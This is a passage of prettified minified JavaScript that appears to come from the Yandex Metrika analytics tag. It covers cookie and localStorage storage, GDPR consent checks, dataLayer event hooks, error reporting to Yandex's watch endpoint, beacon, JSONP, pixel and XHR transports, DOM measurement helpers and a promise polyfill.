          o: function (e, n) {
            return Er(t, "" + r + e, n), this;
          },
          ic: function (e) {
            return Cr(t, "" + r + e), this;
          },
        };
      }
      function Er(t, e, n) {
        var r = Ar(t);
        if (((t = Oi(t, n)), !mu(t)))
          try {
            r.setItem(e, t);
          } catch (t) {}
      }
      function xr(t, e) {
        var n = Ar(t);
        try {
          return ua(t, n.getItem(e));
        } catch (t) {}
        return null;
      }
      function Cr(t, e) {
        var n = Ar(t);
        try {
          n.removeItem(e);
        } catch (t) {}
      }
      function Ar(t) {
        try {
          return t.localStorage;
        } catch (t) {}
        return null;
      }
      function _r(t, e, n) {
        kr(t, "metrika_enabled", "1", 0, e, n, !0);
        var r = Sr(t);
        return (
          (r = r && r.metrika_enabled) && ca(t, "metrika_enabled", e, n, !0),
          !!r
        );
      }
      function kr(t, e, n, r, i, o, a) {
        if ((void 0 === a && (a = !1), Rr(t, Tr, e))) {
          var u = e + "=" + encodeURIComponent(n) + ";";
          if (((u += "" + ns(t)), r)) {
            var c = new Date();
            c.setTime(c.getTime() + 6e4 * r),
              (u += "expires=" + c.toUTCString() + ";");
          }
          i && (u += "domain=" + (r = i.replace(ff, "")) + ";");
          try {
            (t.document.cookie = u + "path=" + (o || "/")), a || (sf(t)[e] = n);
          } catch (t) {}
        }
      }
      function Tr(t, e) {
        var n = sf(t);
        return (n && n[e]) || null;
      }
      function Sr(t) {
        try {
          var e = t.document.cookie;
          if (!_o(e)) {
            var n = {};
            return (
              zu(function (t) {
                var e = (t = t.split("="))[1];
                n[So(t[0])] = So(ji(e));
              }, (e || "").split(";")),
              n
            );
          }
        } catch (t) {}
        return null;
      }
      function Rr(t, e, n) {
        return (
          Fu(n, ["gdpr", "gdpr_popup", "metrika_enabled", "_ym_debug_build"])
            ? (t = !0)
            : ((n = Ir(t)),
              (n = cf(n)),
              (t = e(t, "gdpr")),
              (t = !!Lu(Gu(uf), n).length || Fu(t, [ef, rf]))),
          t
        );
      }
      function Mr(t) {
        return Fu(t, ["GDPR-ok-view-default", "GDPR-ok-view-detailed"])
          ? ef
          : ((t = t.replace("GDPR-ok-view-detailed-", "")), Fu(t, tf) ? t : ef);
      }
      function Nr(t, e, n) {
        void 0 === n && (n = Ho);
        var r = Fr(t);
        n(r);
        var i = wo(r, Dr);
        return (
          Pr(t, e, function (t) {
            t.qa.C(i);
          }),
          r
        );
      }
      function Dr(t, e) {
        var n = mo(e, "ymetrikaEvent");
        n && t.O(mo(n, "type"), n);
      }
      function Pr(t, e, n, r) {
        void 0 === n && (n = qo), void 0 === r && (r = !1);
        var i = Gr(t);
        if (e && ko(e.push)) {
          var o = e.push;
          return (
            (e.push = function () {
              var t = Oo(arguments),
                n = t[0];
              return r && i.O(n), (t = o.apply(e, t)), r || i.O(n), t;
            }),
            n(
              (t = {
                qa: i,
                unsubscribe: function () {
                  e.push = o;
                },
              })
            ),
            zu(i.O, e),
            t
          );
        }
      }
      function Ir(t) {
        var e = (t = Pu(t)).l("dataLayer", []);
        return t.o("dataLayer", e), e;
      }
      function Or(t, e) {
        var n, r;
        t.push((((n = {}).ymetrikaEvent = (((r = {}).type = e), r)), n));
      }
      function Lr(t, e, n) {
        function r() {
          (i = 0), u && ((u = !1), (i = Br(t, r, n)), a.O(o));
        }
        var i,
          o,
          a = Gr(t),
          u = !1;
        return (
          e.C(function (t) {
            return (u = !0), (o = t), i || r(), qo;
          }),
          a
        );
      }
      function jr(t, e) {
        return t.clearInterval(e);
      }
      function Br(t, e, n, r) {
        return no(t, Ur(t, "d.err." + (r || "def"), e), n);
      }
      function Fr(t) {
        var e = {};
        return {
          C: function (n, r) {
            return (
              zu(function (n) {
                mo(e, n) || (e[n] = Gr(t)), e[n].C(r);
              }, n),
              this
            );
          },
          da: function (t, n) {
            return (
              zu(function (t) {
                mo(e, t) && e[t].da(n);
              }, t),
              this
            );
          },
          O: function (n, r) {
            return mo(e, n) ? Ur(t, "e." + r, e[n].O)(r) : [];
          },
        };
      }
      function Gr(t) {
        var e = [],
          n = {};
        return (
          (n.zk = e),
          (n.C = po(yo("push", e), wo(n, Ho))),
          (n.da = po(Uo(jo(t))(e), Uo(yo("splice", e))(1), wo(n, Ho))),
          (n.O = po(Ho, Uo(Wo), Ku(e))),
          n
        );
      }
      function Hr(t, e, n) {
        return function () {
          return Ur(arguments[0], t, e, n).apply(this, arguments);
        };
      }
      function Ur(t, e, n, r, i) {
        var o = n || eo;
        return function () {
          var n = r;
          try {
            n = o.apply(i || null, arguments);
          } catch (n) {
            Yr(t, e, n);
          }
          return n;
        };
      }
      function Xr(t, e) {
        var n = e || Vr(t),
          r = n[0];
        return (
          (n = n[1]),
          !isNaN(r) && ko(n)
            ? Math.round(n() + r)
            : t.Date.now
            ? t.Date.now()
            : new t.Date().getTime()
        );
      }
      function Vr(t) {
        var e = mo((t = zr(t)), "timing.navigationStart"),
          n = mo(t, "now");
        return n && (n = yu(n, t)), [e, n];
      }
      function zr(t) {
        return mo(t, "performance") || mo(t, "webkitPerformance");
      }
      function Yr(t, e, n) {
        var r, i, o, a, u;
        if (!(0.01 >= t.Math.random())) {
          var c = "u.a.e",
            s = "";
          if (
            (n &&
              ("object" == typeof n
                ? ((c = n.message),
                  (s =
                    ("string" == typeof n.stack &&
                      n.stack.replace(/\n/g, "\\n")) ||
                    "n.s.e.s"))
                : (c = "" + n)),
            !(
              bs(c) ||
              Wu(po(yo("indexOf", c), ou(-1), Fo), vs) ||
              (gs(c) && 0.1 <= t.Math.random())
            ))
          ) {
            ((r = {}).jserrs =
              (((i = {})[Pc.Ja] =
                (((o = {})[c] =
                  (((a = {})[e] = (((u = {})[t.location.href] = s), u)), a)),
                o)),
              i)),
              (e = r);
            t: {
              var f;
              r = Pc.Ka + "//mc.yandex.ru/watch/" + Pc.Mg;
              try {
                var h = Qs(t, "er")[0],
                  l = (void 0 === h ? [] : h)[1],
                  d = void 0 === l ? null : l;
              } catch (t) {
                break t;
              }
              ((f = {})["browser-info"] =
                "ar:1:pv:1:v:" + Pc.Ja + ":vf:" + eu.version),
                (f["page-url"] = t.location && "" + t.location.href),
                (h = f),
                (t = Oi(t, e)),
                d &&
                  t &&
                  d(r, { Nb: h, ua: [], $: "site-info=" + Bi(t) }).catch(qo);
            }
          }
        }
      }
      function qr(t) {
        return Vu(function (e) {
          return !e || Fu(e, t) ? e : 0;
        }, Xs);
      }
      function Kr(t) {
        return !lc(t) && Jr(t);
      }
      function Wr(t) {
        return !!Es(t) && wo(t, Zr);
      }
      function Jr(t) {
        var e = mo(t, "navigator.sendBeacon");
        return (
          !(!e || !zo("sendBeacon", e)) &&
          Eo([t, yu(e, mo(t, "navigator"))], $r)
        );
      }
      function $r(t, e, n, r) {
        return new us(function (i, o) {
          if (!mo(t, "navigator.onLine")) return o();
          var a = Nu(r.Nb, { "force-urlencoded": 1 });
          return 2e3 < (a = n + "?" + Li(a) + (r.$ ? "&" + r.$ : "")).length
            ? o(Gi("sb.tlq"))
            : e(a)
            ? i("")
            : o();
        });
      }
      function Zr(t, e, n) {
        return new us(function (r, i) {
          var o,
            a,
            u = "_ymjsp" + Ki(t),
            c = Nu((((o = {}).callback = u), o), n.Nb),
            s = Eo([t, u], Qr);
          (t[u] = function (t) {
            try {
              s(), Ri(f), r(t);
            } catch (t) {
              i(t);
            }
          }),
            (c.wmode = "5");
          var f = si(t, (((a = {}).src = Ii(e, n, c)), a));
          if (!f) return s(), i(ms("jp.s"));
          (o = po((o = wo(f, Ri)), wo(Gi(n.ua), i))),
            (a = no(t, o, n.Sb || 1e4)),
            (a = Eo([t, a], ro)),
            (f.onload = a),
            (f.onerror = po(s, a, o));
        });
      }
      function Qr(t, e) {
        try {
          delete t[e];
        } catch (n) {
          t[e] = void 0;
        }
      }
      function ti(t) {
        var e = Es(t);
        return !!e && Eo([t, e], ei);
      }
      function ei(t, e, n, r) {
        return new us(function (i, o) {
          var a = _i(t),
            u = e("img"),
            c = po(wo(u, Ri), wo(Gi(r.ua), o)),
            s = no(t, c, r.Sb || 3e3);
          (u.onerror = c),
            (u.onload = po(wo(u, Ri), wo(null, i), Eo([t, s], ro))),
            delete (c = Nu({}, r.Nb)).wmode,
            (u.src = Ii(n, r, c)),
            sc(t) &&
              (Nu(u.style, {
                position: "absolute",
                visibility: "hidden",
                width: "0px",
                height: "0px",
              }),
              a.appendChild(u));
        });
      }
      function ni(t, e, n) {
        var r = bi(e);
        return r && ii(t, e, Lu(Boolean, ["p", Us[r], "c"]), Hs, n);
      }
      function ri(t, e) {
        var n = mi(Gs, t, e);
        if (!n) {
          var r = mi("div", t, e);
          r && (ci(Gs + ",div", r).length || (n = r));
        }
        return n;
      }
      function ii(t, e, n, r, i) {
        return Cu(
          function (n, o) {
            var a = null;
            return (
              o in Ls
                ? (a = e.getAttribute && e.getAttribute(Ls[o]))
                : o in js &&
                  (a =
                    "p" === o
                      ? js[o](t, e, i)
                      : "c" === o
                      ? js[o](t, e, r)
                      : js[o](t, e)),
              a &&
                ((a = a.slice(0, Is[o] || 100)),
                (n[o] = Os[o] ? "" + Zo(a) : a)),
              n
            );
          },
          {},
          n
        );
      }
      function oi(t, e, n) {
        if (
          t.document.querySelectorAll &&
          zo("querySelectorAll", mo(t, "Element.prototype.querySelectorAll"))
        )
          return Zi(n.querySelectorAll(e));
        var r = ai(e.split(" "), n);
        return Lu(function (e, n) {
          return jo(t)(e, r) === n;
        }, r);
      }
      function ai(t, e) {
        var n = $o(t),
          r = n.shift();
        return r
          ? ((r = e.getElementsByTagName(r)),
            n.length ? Yu(wo(n, ai), Zi(r)) : Zi(r))
          : [];
      }
      function ui(t, e) {
        if (e.querySelector) return e.querySelector(t);
        var n = ci(t, e);
        return n && n.length ? n[0] : null;
      }
      function ci(t, e) {
        if (!e) return [];
        var n = e.querySelectorAll(t);
        return n ? Zi(n) : [];
      }
      function si(t, e) {
        var n = t.document,
          r = Nu({ type: "text/javascript", charset: "utf-8", async: !0 }, e),
          i = Es(t);
        if (i) {
          var o = i("script");
          ku(
            Ru,
            qu(function (t) {
              var e = t[0];
              (t = t[1]), "async" === e && t ? (o.async = !0) : (o[e] = t);
            })
          )(r);
          try {
            var a = ao("getElementsByTagName", n),
              u = a("head")[0];
            if (!u) {
              var c = a("html")[0];
              (u = i("head")), c && c.appendChild(u);
            }
            return u.insertBefore(o, u.firstChild), o;
          } catch (t) {}
        }
      }
      function fi(t, e, n) {
        for (
          var r = "", i = Ds(), o = bi(e) || "*";
          e && e.parentNode && !Fu(o, ["BODY", "HTML"]);

        )
          (r += i[o] || "*"),
            (r += hi(t, e, n) || ""),
            (o = bi((e = e.parentElement)) || "*");
        return So(r, 128);
      }
      function hi(t, e, n) {
        if ((t = li(t, e))) {
          t = t.childNodes;
          for (var r = e && e.nodeName, i = 0, o = 0; o < t.length; o += 1)
            if (r === (t[o] && t[o].nodeName)) {
              if (e === t[o]) return i;
              (n && t[o] === n) || (i += 1);
            }
        }
        return 0;
      }
      function li(t, e) {
        var n = mo(t, "document");
        if (!e || e === n.documentElement) return null;
        if (e === ki(t)) return n.documentElement;
        n = null;
        try {
          n = e.parentNode;
        } catch (t) {}
        return n;
      }
      function di(t, e) {
        var n = vi(t, e),
          r = n.left;
        n = n.top;
        var i = pi(t, e);
        return [r, n, i[0], i[1]];
      }
      function pi(t, e) {
        var n = mo(t, "document");
        if (e === ki(t) || e === n.documentElement) {
          n = _i(t);
          var r = Ci(t);
          return [
            Math.max(n.scrollWidth, r[0]),
            Math.max(n.scrollHeight, r[1]),
          ];
        }
        return (n = Ei(e))
          ? [n.width, n.height]
          : [e.offsetWidth, e.offsetHeight];
      }
      function vi(t, e) {
        var n = e,
          r = mo(t, "document"),
          i = bi(n);
        if (
          !n ||
          !n.ownerDocument ||
          "PARAM" === i ||
          n === ki(t) ||
          n === r.documentElement
        )
          return { left: 0, top: 0 };
        if ((r = n.getBoundingClientRect && Ei(n)))
          return (
            (n = xi(t)),
            { left: Math.round(r.left + n.x), top: Math.round(r.top + n.y) }
          );
        for (i = r = 0; n; )
          (r += n.offsetLeft), (i += n.offsetTop), (n = n.offsetParent);
        return { left: r, top: i };
      }
      function mi(t, e, n) {
        if (!(e && e.Element && e.Element.prototype && e.document && n))
          return null;
        if (
          e.Element.prototype.closest &&
          zo("closest", e.Element.prototype.closest) &&
          n.closest
        )
          return n.closest(t);
        var r = xs(e);
        if (r) {
          for (; n && 1 === n.nodeType && !r.call(n, t); )
            n = n.parentElement || n.parentNode;
          return n && 1 === n.nodeType ? n : null;
        }
        if (
          e.document.querySelectorAll &&
          zo("querySelectorAll", mo(e, "Element.prototype.querySelectorAll"))
        ) {
          for (
            t = Zi((e.document || e.ownerDocument).querySelectorAll(t));
            n && 1 === n.nodeType && -1 === jo(e)(n, t);

          )
            n = n.parentElement || n.parentNode;
          return n && 1 === n.nodeType ? n : null;
        }
        return null;
      }
      function gi(t) {
        return Cs(t) && !Wu(ou(t.type), Ms)
          ? ks(t)
            ? !t.checked
            : !t.value
          : As(t)
          ? !t.value
          : !_s(t) || 0 > t.selectedIndex;
      }
      function bi(t) {
        if (t)
          try {
            var e = t.nodeName;
            if (No(e)) return e;
            if (No((e = t.tagName))) return e;
          } catch (t) {}
      }
      function yi(t, e) {
        var n = t.document.getElementsByTagName("form");
        return jo(t)(e, Zi(n));
      }
      function wi(t, e, n) {
        n = ao("dispatchEvent", n || t.document);
        var r = null,
          i = mo(t, "Event.prototype.constructor");
        if (
          i &&
          (zo("(Event|Object|constructor)", i) ||
            (bc(t) && "[object Event]" == "" + i))
        )
          try {
            r = new t.Event(e);
          } catch (n) {
            if ((t = ao("createEvent", mo(t, "document"))) && ko(t)) {
              try {
                r = t(e);
              } catch (t) {}
              r && r.initEvent && r.initEvent(e, !1, !1);
            }
          }
        r && n(r);
      }
      function Ei(t) {
        try {
          return t.getBoundingClientRect && t.getBoundingClientRect();
        } catch (t) {
          return "object" == typeof t &&
            null !== t &&
            16389 === (t.Tf && 65535 & t.Tf)
            ? { top: 0, bottom: 0, left: 0, width: 0, height: 0, right: 0 }
            : null;
        }
      }
      function xi(t) {
        var e = ki(t),
          n = mo(t, "document");
        return {
          x:
            t.pageXOffset ||
            (n.documentElement && n.documentElement.scrollLeft) ||
            (e && e.scrollLeft) ||
            0,
          y:
            t.pageYOffset ||
            (n.documentElement && n.documentElement.scrollTop) ||
            (e && e.scrollTop) ||
            0,
        };
      }
      function Ci(t) {
        var e = Ai(t);
        if (e) {
          var n = e[2];
          return [t.Math.round(e[0] * n), t.Math.round(e[1] * n)];
        }
        return [
          mo((e = _i(t)), "clientWidth") || t.innerWidth,
          mo(e, "clientHeight") || t.innerHeight,
        ];
      }
      function Ai(t) {
        var e = mo(t, "visualViewport.width"),
          n = mo(t, "visualViewport.height");
        return (
          (t = mo(t, "visualViewport.scale")),
          _o(e) || _o(n) ? null : [Math.floor(e), Math.floor(n), t]
        );
      }
      function _i(t) {
        var e = mo(t, "document") || {},
          n = e.documentElement;
        return "CSS1Compat" === e.compatMode ? n : ki(t) || n;
      }
      function ki(t) {
        t = mo(t, "document");
        try {
          return t.getElementsByTagName("body")[0];
        } catch (t) {
          return null;
        }
      }
      function Ti(t, e) {
        try {
          return new RegExp("(?:^|\\s)" + t + "(?:\\s|$)").test(e.className);
        } catch (t) {
          return !1;
        }
      }
      function Si(t) {
        var e;
        try {
          (e = t.target || t.srcElement) &&
            (!e.ownerDocument && e.documentElement
              ? (e = e.documentElement)
              : e.ownerDocument !== document && (e = null));
        } catch (t) {}
        return e;
      }
      function Ri(t) {
        var e = t && t.parentNode;
        e && e.removeChild(t);
      }
      function Mi(t) {
        return !_o(t) && (3 === (t = t.nodeType) || 8 === t);
      }
      function Ni(t) {
        var e;
        return (
          (e = mo(t, "XMLHttpRequest")) &&
            (e = "withCredentials" in new t.XMLHttpRequest()) &&
            (e = !(e = !!(
              ys.test(t.location.host) &&
              t.opera &&
              ko(t.opera.version) &&
              "string" == typeof (e = t.opera.version()) &&
              "12" === e.split(".")[0]
            ))),
          !!e && wo(t, Di)
        );
      }
      function Di(t, e, n) {
        var r,
          i = new t.XMLHttpRequest(),
          o = n.$,
          a = Nu(n.Se ? (((r = {}).wmode = "7"), r) : {}, n.Nb);
        return new us(function (r, u) {
          i.open(n.Gg || "GET", e + "?" + Li(a), !0),
            (i.withCredentials = !1 !== n.Ig),
            n.Sb && (i.timeout = n.Sb),
            ku(
              Ru,
              qu(function (t) {
                i.setRequestHeader(t[0], t[1]);
              })
            )(n.Mb);
          var c = Eo([t, i, Gi(n.ua), n.Se, n.mj, r, u], Pi);
          i.onreadystatechange = c;
          try {
            i.send(o);
          } catch (t) {}
        });
      }
      function Pi(t, e, n, r, i, o, a, u) {
        if (4 === e.readyState)
          if ((200 === e.status || i || a(n), i))
            200 === e.status
              ? o(e.responseText)
              : a(
                  ms(
                    "http." +
                      e.status +
                      ".st." +
                      e.statusText +
                      ".rt." +
                      ("" + e.responseText).substring(0, 50)
                  )
                );
          else {
            if (((i = null), r))
              try {
                (i = ua(t, e.responseText)) || a(n);
              } catch (t) {
                a(n);
              }
            o(i);
          }
        return u;
      }
      function Ii(t, e, n) {
        return (
          (n = Li(n)) && (t += "?" + n), e.$ && (t += (n ? "&" : "?") + e.$), t
        );
      }
      function Oi(t, e, n) {
        try {
          return t.JSON.stringify(e, null, n);
        } catch (t) {
          return null;
        }
      }
      function Li(t) {
        return t
          ? po(
              Ru,
              go(function (t, e) {
                var n = e[0],
                  r = e[1];
                return gu(r) || _o(r) || t.push(n + "=" + Bi(r)), t;
              }, []),
              uu("&")
            )(t)
          : "";
      }
      function ji(t) {
        var e = "";
        try {
          e = decodeURIComponent(t);
        } catch (t) {}
        return e;
      }
      function Bi(t) {
        try {
          return encodeURIComponent(t);
        } catch (t) {}
        return (
          (t = iu(
            "",
            Lu(function (t) {
              return 55296 >= t.charCodeAt(0);
            }, t.split(""))
          )),
          encodeURIComponent(t)
        );
      }
      function Fi() {
        var t = Oo(arguments);
        return eo(Gi(t));
      }
      function Gi(t) {
        var e = "";
        return (
          lo(t) ? (e = iu(".", t)) : No(t) && (e = t),
          ms("err.kn(" + Pc.Ja + ")" + e)
        );
      }
      function Hi(t) {
        this.message = t;
      }
      function Ui(t, e, n, r, i) {
        var o = t.addEventListener && t.removeEventListener,
          a = !o && t.attachEvent && t.detachEvent;
        (o || a) &&
          ((i = i
            ? o
              ? "removeEventListener"
              : "detachEvent"
            : o
            ? "addEventListener"
            : "attachEvent"),
          o ? t[i](e, n, r) : t[i]("on" + e, n));
      }
      function Xi(t) {
        return Cu(
          function (e, n) {
            var r = mo(t, "location." + n);
            return (e[n] = r ? "" + r : ""), e;
          },
          {},
          Vc
        );
      }
      function Vi(t) {
        var e = t.match(Yc);
        if (e) {
          if (((t = e[1]), (e = e[2]))) return !!Fu(e, zc) && e;
          if (t) return zc[0];
        }
        return !1;
      }
      function zi(t) {
        return (t = Fc(t)), Bc[t] && Bc[t].Ej;
      }
      function Yi(t, e) {
        var n = Fc(t),
          r = mo(e, "__ym.turbo_page"),
          i = mo(e, "__ym.turbo_page_id");
        Bc[n] || (Bc[n] = {}), (r || i) && ((Bc[n].Ej = r), (Bc[n].Fj = i));
      }
      function qi(t) {
        return Fu(
          "prerender",
          Vu(wo(mo(t, "document"), mo), [
            "webkitVisibilityState",
            "visibilityState",
          ])
        );
      }
      function Ki(t, e, n) {
        var r = gu(n);
        return (
          gu(e) && r
            ? ((r = 1), (e = 1073741824))
            : r
            ? (r = 1)
            : ((r = e), (e = n)),
          t.Math.floor(t.Math.random() * (e - r)) + r
        );
      }
      function Wi(t, e) {
        return t.isFinite(e) && !t.isNaN(e) && "[object Number]" === Do(e);
      }
      function Ji(t, e) {
        return zu(po(Ho, yo("push", t)), e), t;
      }
      function $i(t, e) {
        return Array.prototype.sort.call(e, t);
      }
      function Zi(t) {
        return t
          ? lo(t)
            ? t
            : hu
            ? hu(t)
            : "number" == typeof t.length && 0 <= t.length
            ? Lo(t)
            : []
          : [];
      }
      function Qi(t, e, n) {
        return n ? t : e;
      }
      function to(t, e, n) {
        try {
          if (ko(e)) {
            var r = Oo(arguments).slice(3);
            _o(n) ? e.apply(void 0, r) : yu.apply(void 0, $o([e, n], r))();
          }
        } catch (e) {
          no(t, wo(e, eo), 0);
        }
      }
      function eo(t) {
        throw t;
      }
      function no(t, e, n) {
        return ao("setTimeout", t)(e, n);
      }
      function ro(t, e) {
        return ao("clearTimeout", t)(e);
      }
      function io() {
        return [];
      }
      function oo() {
        return {};
      }
      function ao(t, e) {
        var n = mo(e, t),
          r = mo(e, "constructor.prototype." + t) || n;
        try {
          if (r && r.apply)
            return function () {
              return r.apply(e, arguments);
            };
        } catch (t) {
          return n;
        }
        return r;
      }
      function uo(t, e) {
        return function () {
          var n = Oo(arguments),
            r = n[0];
          n = n.slice(1);
          var i = Pu(r),
            o = i.l("m802", {}),
            a = mo(o, t);
          return (
            a || ((a = Io(e)), (o[t] = a), i.o("m802", o)),
            a.apply(void 0, $o([r], n))
          );
        };
      }
      function co(t) {
        var e = ((t = t.Ya = t.Ya || {})._metrika = t._metrika || {});
        return {
          Fa: function (t, n) {
            return Su.call(e, t) || (e[t] = n), this;
          },
          o: function (t, n) {
            return (e[t] = n), this;
          },
          l: function (t, n) {
            var r = e[t];
            return Su.call(e, t) || gu(n) ? r : n;
          },
        };
      }
      function so(t) {
        var e,
          n = [];
        for (e in t) ho(t, e) && n.push(e);
        return n;
      }
      function fo(t, e) {
        return Co(
          function (e, n, r) {
            return t(n, r) && e.push(n), e;
          },
          [],
          e
        );
      }
      function ho(t, e) {
        return !_o(t) && Su.call(t, e);
      }
      function lo(t) {
        return tu || (tu = Vo(Array.isArray, "isArray")) || (tu = Tu), tu(t);
      }
      function po() {
        var t = Oo(arguments),
          e = t.shift();
        return function () {
          var n = e.apply(void 0, arguments);
          return Cu(Ko, n, t);
        };
      }
      function vo(t, e) {
        return (
          void 0 === e && (e = {}),
          !t ||
            1 > t.length ||
            Cu(
              function (e, n, r) {
                return r === t.length - 1
                  ? e
                  : (r === t.length - 2
                      ? (e[n] = t[r + 1])
                      : e[n] || (e[n] = {}),
                    e[n]);
              },
              e,
              t
            ),
          e
        );
      }
      function mo(t, e) {
        return t
          ? Cu(
              function (t, e) {
                if (_o(t)) return t;
                try {
                  return t[e];
                } catch (t) {}
                return null;
              },
              t,
              e.split(".")
            )
          : null;
      }
      function go(t, e) {
        return Eo([t, e], Cu);
      }
      function bo(t) {
        return yo("test", t);
      }
      function yo(t, e) {
        return yu(e[t], e);
      }
      function wo(t, e) {
        return Eo([t], e);
      }
      function Eo(t, e) {
        return yu.apply(void 0, $o([e, null], t));
      }
      function xo(t, e, n) {
        void 0 === e && (e = []), (n = n || {});
        var r,
          i = e.length,
          o = t;
        return (
          ko(o) && (n[(o = "d")] = t),
          i
            ? 1 === i
              ? (r = n[o](e[0]))
              : 2 === i
              ? (r = n[o](e[0], e[1]))
              : 3 === i
              ? (r = n[o](e[0], e[1], e[2]))
              : 4 === i && (r = n[o](e[0], e[1], e[2], e[3]))
            : (r = n[o]()),
          r
        );
      }
      function Co(t, e, n) {
        for (var r = 0, i = n.length; r < i; ) (e = t(e, n[r], r)), (r += 1);
        return e;
      }
      function Ao(t) {
        return !mu(t) && !gu(t) && "[object Object]" === Do(t);
      }
      function _o(t) {
        return gu(t) || mu(t);
      }
      function ko(t) {
        return "function" == typeof t;
      }
      function To(t) {
        return t
          .replace(/\^/g, "\\^")
          .replace(/\$/g, "\\$")
          .replace(lu, "\\.")
          .replace(/\[/g, "\\[")
          .replace(/\]/g, "\\]")
          .replace(/\|/g, "\\|")
          .replace(/\(/g, "\\(")
          .replace(/\)/g, "\\)")
          .replace(/\?/g, "\\?")
          .replace(/\*/g, "\\*")
          .replace(/\+/g, "\\+")
          .replace(/\{/g, "\\{")
          .replace(/\}/g, "\\}");
      }
      function So(t, e) {
        if (t) {
          var n = vu ? vu.call(t) : ("" + t).replace(pu, "");
          return e && n.length > e ? n.substr(0, e) : n;
        }
        return "";
      }
      function Ro(t, e) {
        return !(!t || -1 === Mo(t, e));
      }
      function Mo(t, e) {
        if (du) var n = du.call(t, e);
        else
          t: {
            n = 0;
            for (var r = t.length - e.length, i = 0; i < t.length; i += 1) {
              if ((n = t[i] === e[n] ? n + 1 : 0) === e.length) {
                n = i - e.length + 1;
                break t;
              }
              if (!n && i > r) break;
            }
            n = -1;
          }
        return n;
      }
      function No(t) {
        return "string" == typeof t;
      }
      function Do(t) {
        return Object.prototype.toString.call(t);
      }
      function Po(t, e) {
        return (Po =
          Object.setPrototypeOf ||
          ({ __proto__: [] } instanceof Array &&
            function (t, e) {
              t.__proto__ = e;
            }) ||
          function (t, e) {
            for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]);
          })(t, e);
      }
      function Io(t, e) {
        var n = [],
          r = [],
          i = e || Ho;
        return function () {
          var e = Oo(arguments),
            o = i.apply(void 0, e),
            a = su(o, r);
          return -1 !== a
            ? n[a]
            : ((e = t.apply(void 0, e)), n.push(e), r.push(o), e);
        };
      }
      function Oo(t) {
        if (hu)
          try {
            return hu(t);
          } catch (t) {}
        return Lo(t);
      }
      function Lo(t) {
        for (var e = t.length, n = [], r = 0; r < e; r += 1) n.push(t[r]);
        return n;
      }
      function jo(t) {
        if (Qa) return Qa;
        var e = !1;
        try {
          e = [].indexOf && 0 === [void 0].indexOf(void 0);
        } catch (t) {}
        var n =
          t.Array &&
          t.Array.prototype &&
          Vo(t.Array.prototype.indexOf, "indexOf");
        return (Qa =
          e && n
            ? function (t, e) {
                return n.call(e, t);
              }
            : Bo);
      }
      function Bo(t, e) {
        for (var n = 0; n < e.length; n += 1) if (e[n] === t) return n;
        return -1;
      }
      function Fo(t) {
        return !t;
      }
      function Go(t, e) {
        return e;
      }
      function Ho(t) {
        return t;
      }
      function Uo(t) {
        return function (e) {
          return function (n) {
            return t(n, e);
          };
        };
      }
      function Xo(t) {
        return function (e) {
          return function (n) {
            return t(e, n);
          };
        };
      }
      function Vo(t, e) {
        return zo(e, t) && t;
      }
      function zo(t, e) {
        var n = Yo(t, e);
        return e && !n && nu.push([t, e]), n;
      }
      function Yo(t, e) {
        if (!e || "function" != typeof e) return !1;
        try {
          var n = "" + e;
        } catch (t) {
          return !1;
        }
        var r = n.length;
        if (r > 35 + t.length) return !1;
        for (var i = r - 13, o = 0, a = 8; a < r; a += 1) {
          if (
            12 ===
            (o =
              "[native code]"[o] === n[a] || (7 === o && "-" === n[a])
                ? o + 1
                : 0)
          )
            return !0;
          if (!o && a > i) break;
        }
        return !1;
      }
      function qo() {}
      function Ko(t, e) {
        return e(t);
      }
      function Wo(t, e) {
        return e ? t(e) : t();
      }
      function Jo(t, e) {
        function n() {
          this.constructor = t;
        }
        Po(t, e),
          (t.prototype =
            null === e
              ? Object.create(e)
              : ((n.prototype = e.prototype), new n()));
      }
      function $o() {
        for (var t = 0, e = 0, n = arguments.length; e < n; e++)
          t += arguments[e].length;
        t = Array(t);
        var r = 0;
        for (e = 0; e < n; e++)
          for (var i = arguments[e], o = 0, a = i.length; o < a; o++, r++)
            t[r] = i[o];
        return t;
      }
      function Zo(t) {
        for (var e = 2166136261, n = (t = "" + t).length, r = 0; r < n; r += 1)
          (e ^= t.charCodeAt(r)),
            (e += (e << 1) + (e << 4) + (e << 7) + (e << 8) + (e << 24));
        return e >>> 0;
      }
      function Qo() {}
      function ta(t) {
        if (!(this instanceof ta))
          throw new TypeError("Promises must be constructed via new");
        if ("function" != typeof t) throw new TypeError("not a function");
        (this.za = 0),
          (this.Te = !1),
          (this.Ha = void 0),
          (this.tb = []),
          aa(t, this);
      }
      function ea(t, e) {
        for (; 3 === t.za; ) t = t.Ha;
        0 === t.za
          ? t.tb.push(e)
          : ((t.Te = !0),
            ta.Ue(function () {
              var n = 1 === t.za ? e.Ui : e.Yi;
              if (null === n) (1 === t.za ? na : ra)(e.Qa, t.Ha);
              else {
                try {
                  var r = n(t.Ha);
                } catch (t) {
                  return void ra(e.Qa, t);
                }
                na(e.Qa, r);
              }
            }));
      }
      function na(t, e) {
        try {
          if (e === t)
            throw new TypeError("A promise cannot be resolved with itself.");
          if (e && ("object" == typeof e || "function" == typeof e)) {
            var n = e.then;
            if (e instanceof ta) return (t.za = 3), (t.Ha = e), void ia(t);
            if ("function" == typeof n)
              return void aa(
                (function (t, e) {
                  return function () {
                    t.apply(e, arguments);
                  };
                })(n, e),
                t
              );
          }
          (t.za = 1), (t.Ha = e), ia(t);
        } catch (e) {
          ra(t, e);
        }
      }
      function ra(t, e) {
        (t.za = 2), (t.Ha = e), ia(t);
      }
      function ia(t) {
        2 === t.za &&
          0 === t.tb.length &&
          ta.Ue(function () {
            t.Te || ta.Vg(t.Ha);
          });
        for (var e = 0, n = t.tb.length; e < n; e++) ea(t, t.tb[e]);
        t.tb = null;
      }
      function oa(t, e, n) {
        (this.Ui = "function" == typeof t ? t : null),
          (this.Yi = "function" == typeof e ? e : null),
          (this.Qa = n);
      }
      function aa(t, e) {
        var n = !1;
        try {
          t(
            function (t) {
              n || ((n = !0), na(e, t));
            },
            function (t) {
              n || ((n = !0), ra(e, t));
            }
          );
        } catch (t) {
          n || ((n = !0), ra(e, t));
        }
      }
      function ua(t, e) {
        if (!e) return null;
        try {
          return t.JSON.parse(e);
        } catch (t) {
          return null;
        }
      }
      function ca(t, e, n, r, i) {
        return void 0 === i && (i = !1), kr(t, e, "", -100, n, r, i);
      }
      function sa(t, e, n) {
        void 0 === e && (e = "_ym_"), void 0 === n && (n = "");
        var r = hf(t),
          i = 1 === (r || "").split(".").length ? r : "." + r,
          o = n ? "_" + n : "";
        return {
          ic: function (n, r, a) {
